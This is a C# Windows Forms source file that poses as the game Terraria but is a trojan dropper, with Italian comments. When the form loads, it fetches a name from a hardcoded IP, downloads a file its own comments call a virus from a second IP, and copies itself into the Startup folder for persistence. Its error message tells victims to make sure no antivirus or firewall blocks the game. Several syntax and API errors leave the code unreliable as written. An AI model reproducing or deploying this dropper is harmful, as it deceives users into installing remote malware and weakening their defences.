using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Terraria
{
    public partial class Terraria : Form
    {
        public Terraria()
        {
            InitializeComponent();
        }
        private void Terraria_Load(object sender, EventArgs e)
        {
            //PROVA AD ESEGUIRE IL TUTTO
            //
            try
            {
                //VARIABILI
                //
                string download = "http://89.234.182.77/server.html;

                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(download);
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();

                if (response.StatusCode == HttpStatusCode.OK)
                {
                  Stream receiveStream = response.GetResponseStream();
                  StreamReader readStream = null;

                  if (response.CharacterSet == null)
                  {
                     readStream = new StreamReader(receiveStream);
                  }
                  else
                  {
                     readStream = new StreamReader(receiveStream, Encoding.GetEncoding(response.CharacterSet));
                  }

                  download = readStream.ReadToEnd();

                  response.Close();
                  readStream.Close();
                }
                //
                //

                //NOME DEL FILE
                //
                string file = System.AppDomain.CurrentDomain.FriendlyName;
                file = file.Replace(".vshost", "");
                this.Text = file;
                //
                //

                //DOWNLOAD DEL VIRUS
                //
                WebClient Client = new WebClient ();
                Client.DownloadFile("http://89.234.182.78/download/" + download);
                //
                //

                //AGGIUNTA ALLO STARTUP
                //
                try
                {
                    System.IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\" + download);
                }
                catch
                {
                    this.Close();
                }
                //
                //
            }
            //CATTURA L'ERRORE
            //
            catch
            {
                Console.Title = "Terraria - Errore";
                Console.WriteLine("Errore, il gioco non può essere avviato perchè non vi è nessuna connessione ad internet\noppure controlla che non ci sia nessun antivirus/firewall che blocchi il gioco");
            }
            //
            //
        }
    }
}
